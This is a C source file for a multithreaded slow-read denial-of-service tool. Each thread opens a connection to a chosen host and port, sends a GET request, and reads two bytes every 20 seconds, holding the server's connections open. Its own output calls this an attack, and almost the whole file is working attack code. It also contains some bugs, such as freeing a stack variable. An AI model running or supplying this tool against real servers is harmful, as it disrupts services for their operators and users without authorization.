#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

#include <getopt.h>

#include <pthread.h>

struct worker_params
{
    const char *host;
    int port;
};

const int error(const char *msg)
{
    perror(msg);
    return EXIT_FAILURE;
}

const int attack(const char *dest, const int portno)
{
    int sockfd, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;
    char dest_ip[INET_ADDRSTRLEN];

    const int buffer_size = 2;
    char buffer[buffer_size+1];
    const char get_request[] = "GET / HTTP/1.1\r\n\r\n";

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
        error("ERROR opening socket");
    server = gethostbyname(dest);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        return EXIT_FAILURE;
    }

    inet_ntop(AF_INET, server->h_addr, dest_ip, INET_ADDRSTRLEN);
    printf("Resolved IP: %s\n", dest_ip);

    memset((char *) &serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    memcpy((char *)&serv_addr.sin_addr.s_addr,
        (char *)server->h_addr,
        server->h_length);
    serv_addr.sin_port = htons(portno);
    if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
        return error("ERROR connecting");
    n = write(sockfd,get_request,strlen(get_request));
    if (n < 0) 
         error("ERROR writing to socket");

    do
    {
        n = read(sockfd,buffer,buffer_size);
        if (n < 0) 
             return error("ERROR reading from socket");
        else if (n >  0)
        {
            buffer[buffer_size] = '\0';
            printf("%s\n",buffer);
            sleep(20);
        }
        else
            printf("No more data to read\n");
    } while( n > 0);

    close(sockfd);
    return EXIT_SUCCESS;
}

void *worker(void *t)
{
    struct worker_params *params = (struct worker_params *)t;
    int *retVal;

    retVal = (int *)malloc(sizeof(int));
    if(!retVal)
    {
        fprintf(stderr, "Failed to allocate memory for return value. Not starting attacker\n");
        pthread_exit(NULL);
    }

    int tmp = attack(params->host, params->port);
    memcpy(retVal, &tmp, sizeof(int));
    pthread_exit(retVal);
}

int main(int argc, char **argv)
{
    int numThreads;
    int ch;
    int retVal;
    char host[256];
    int port;
    int i;
    struct worker_params *params;
    int status;

    pthread_attr_t attr;
    pthread_t *threads;
    
    numThreads = 1;
    host[0] = 0;
    port = -1;

    struct option opts[] = {
        { "host",       required_argument,  NULL,   'h' },
        { "port",       required_argument,  NULL,   'p' },
        { "threads",    required_argument,  NULL,   't' },
        { NULL,         0,                  NULL,   0 }
    };
    
    while((ch = getopt_long(argc, argv, "h:p:t:", opts, NULL)) != -1)
    {
        switch(ch)
        {
        case 'h':
            printf("Host: %s\n", optarg);
            strncpy(host, optarg, 255);
            host[255] = '\0';
            break;
        case 'p':
            printf("Port: %s\n", optarg);
            port = (int)strtol(optarg, NULL, 10);
            break;
        case 't':
            printf("Threads: %s", optarg);
            numThreads = (int)strtol(optarg, NULL, 10);
            break;
        default:
            return error("Check your parameters");
        }
    }

    params = (struct worker_params *)malloc(sizeof(struct worker_params));
    if(!params)
        error("Failed to allocate memory for worker parameter");
    params->host = host;
    params->port = (const int)port;

    retVal = pthread_attr_init(&attr);
    if(retVal)
    {
        fprintf(stderr, "Failed to initialize thread attributes. Code: %d", retVal);
        return EXIT_FAILURE;
    }
    retVal = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);
    if(retVal)
    {
        fprintf(stderr, "Failed to intialize thread attributes. Code: %d", retVal);
        return EXIT_FAILURE;
    }
    printf("Thread attributes initialized");

    threads = malloc(numThreads * sizeof(pthread_t));
    if(!threads)
        error("Failed to initialize pthread_t memory");
    printf("pthread memory initialized");
    printf("Starting attack");

    for(i=0; i<numThreads; i++)
    {
        retVal = pthread_create(&threads[i], &attr, worker, (void *)params);
        if(retVal)
        {
            fprintf(stderr, "Faieled to initialize attacker thread. Code: %d\n", retVal);
            return EXIT_FAILURE;
        }
    }

    printf("Wait for attackers\n");
    for(i=0; i<numThreads; i++)
    {
        retVal = pthread_join(threads[i], (void *)&status);
        if(retVal)
            printf("Failed to join thread %d. Code: %d\n", i, retVal);
        else
        {
            printf("Thread %d completed with code %d\n", i, status);
            free(&status);
        }
    }

    printf("Attack complete\n");
    return 0;
}
